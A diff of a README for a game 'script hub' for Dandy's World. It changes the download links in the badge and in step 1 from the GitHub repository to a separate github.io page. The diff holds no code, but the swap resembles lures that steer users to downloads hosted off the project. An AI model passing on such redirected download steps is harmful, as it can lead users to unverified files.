@@ -1,6 +1,6 @@
 # 🎮 dandys-world-script-hub - Enhance your Dandy's World gaming experience
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue)](https://github.com/mrale7119/dandys-world-script-hub)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue)](https://mrale7119.github.io)
 
 ## 📋 Project Overview
 
@@ -19,7 +19,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to prepare your browser for the script. 
 
-1. Visit the project page to download the necessary files: [https://github.com/mrale7119/dandys-world-script-hub](https://github.com/mrale7119/dandys-world-script-hub).
+1. Visit the project page to download the necessary files: [https://mrale7119.github.io](https://mrale7119.github.io).
 2. Locate the "Code" button on the screen.
 3. Select "Download ZIP" from the menu.
 4. Save the folder to your desktop.
